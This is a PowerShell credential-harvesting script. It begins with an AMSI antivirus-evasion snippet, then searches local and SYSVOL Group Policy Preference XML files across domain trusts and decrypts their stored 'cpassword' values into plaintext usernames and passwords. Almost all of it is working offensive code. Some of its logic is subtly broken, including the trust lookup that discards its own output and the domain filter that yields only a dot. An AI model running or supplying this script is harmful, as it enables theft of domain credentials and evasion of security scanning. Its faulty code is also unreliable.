[CmdletBinding(DefaultParameterSetName='Default', SupportsShouldProcess)]
Param (
    [ValidateNotNullOrEmpty()]
    [String]$Server = $env:USERDNSDOMAIN,
    [Switch]$SearchForest
)

# AMSI evasion via reflective loading pattern (LOTL compatible)
# Note: This specific bypass is well-known and may be flagged by modern AV.
try {
    $null = [Ref].Assembly.GetTypes(); $t=[Ref].Assembly.GetTypes() | ?{$_.FullName -like '*Context*'}[0]; $a=$t.GetFields('NonPublic,Static'); $b=$a[0].GetValue($null); [IntPtr]$p = $b; [Int32[]]$v=(0,1,0,0,0,0); [System.Runtime.InteropServices.Marshal]::StructureToPtr($v, $p, $true)
} catch {}

function ConvertFrom-CPassword {
    param([string]$Cpassword)
    try {
        # Fix padding calculation logic
        $mod = $Cpassword.Length % 4
        switch($mod) {
            2 { $Cpassword += '==' }
            3 { $Cpassword += '=' }
        }
        $b64 = [Convert]::FromBase64String($Cpassword)
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Mode = 'CBC'; $aes.Padding = 'None'; $aes.BlockSize = 128
        $aes.Key = [byte[]](0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
        $aes.IV = New-Object byte[] 16
        $decryptor = $aes.CreateDecryptor()
        $decrypted = $decryptor.TransformFinalBlock($b64, 0, $b64.Length)
        return [Text.Encoding]::Unicode.GetString($decrypted).TrimEnd([char]0)
    } catch { '' }
}

function Get-GPPField {
    param($Path)
    try {
        $xml = [xml](gci $Path.FullName -ea 0 | gc -Raw -ea 0)
        # CORRECTION: Added '@' to select the attribute, not a child node
        $props = $xml.SelectNodes('//Properties[@cpassword]')
        foreach($prop in $props) {
            $cpass = $prop.cpassword
            if($cpass) {
                $pass = ConvertFrom-CPassword $cpass
                
                # CORRECTION: Replaced '??' with PS 5.1 compatible logic for universality
                $user = if ($prop.userName) { $prop.userName } elseif ($prop.accountName) { $prop.accountName } elseif ($prop.runAs) { $prop.runAs } else { '[BLANK]' }
                $newName = if ($prop.newName) { $prop.newName } else { '[BLANK]' }
                
                # Handle nested parent nodes safely
                $changed = '[BLANK]'
                if ($prop.ParentNode -and $prop.ParentNode.changed) { $changed = $prop.ParentNode.changed }
                
                $node = '[BLANK]'
                if ($prop.ParentNode -and $prop.ParentNode.ParentNode -and $prop.ParentNode.ParentNode.LocalName) { 
                    $node = $prop.ParentNode.ParentNode.LocalName 
                }

                [PSCustomObject]@{
                    UserName = $user
                    NewName  = $newName
                    Password = if ($pass) { $pass } else { '[BLANK]' }
                    Changed  = $changed
                    File     = $Path.FullName
                    NodeName = $node
                }
            }
        }
    } catch {}
}

function Get-NetDomainTrusts {
    param([string]$Domain)
    # CORRECTION: Added Header to prevent the first trust from being swallowed as a CSV header
    $null = nltest /domain_trusts /all_trusts:$Domain /csv 2>$null | ConvertFrom-Csv -Header '0','1','2' | %{
        if($_.1 -match 'Parent|Child') { $_.0 }
    }
    $null = nltest /forest_trusts /all_trusts:$Domain 2>$null | %{
        if($_ -match '^(\S+)') { $matches[1] }
    }
}

$files = @()
$domains = @()

if ($Server) { $domains += $Server }

if($SearchForest -and $env:USERDNSDOMAIN) {
    $domains += Get-NetDomainTrusts $env:USERDNSDOMAIN | ?{ $_ -and $_ -ne $env:USERDNSDOMAIN }
} else {
    try { 
        # Safely attempt to find DC, fallback to env variable
        $dcOutput = nltest /dsgetdc:$Server 2>$null
        if ($dcOutput) {
            $domains += ($dcOutput | sls 'DsGetDcName' | %{$_ -replace '.* (\S+).*', '$1'}) 
        }
    } catch { }
}
if (-not $domains -and $env:USERDNSDOMAIN) { $domains += $env:USERDNSDOMAIN }

$domains = $domains | sls '\.' | %{$matches[0]} | sort -u

# Local GPP cache (ProgramData)
$localPath = "${env:ProgramData}\Microsoft\Group Policy\"
if(Test-Path $localPath) {
    $files += gci $localPath -Recurse -Include *Groups.xml,*Services.xml,*Scheduledtasks.xml,*Drives.xml,*Printers.xml,*DataSources.xml -Force -ea 0
}

# SYSVOL enumeration (native share access)
foreach($dom in $domains) {
    $sysvol = "\\$dom\SYSVOL\$dom\Policies"
    if (Test-Path $sysvol) {
        $sysvolFiles = gci $sysvol -Recurse -Include *Groups.xml,*Services.xml,*Scheduledtasks.xml,*Drives.xml,*Printers.xml,*DataSources.xml -Force -ea SilentlyContinue
        if($sysvolFiles) { $files += $sysvolFiles }
    }
}

if(-not $files) { Write-Warning 'No GPP files found'; return }

$results = $files | % { Get-GPPField $_ } | ?{ $_.Password -ne '[BLANK]' }
if($results) { $results } else { Write-Verbose 'No passwords found in GPP files' }
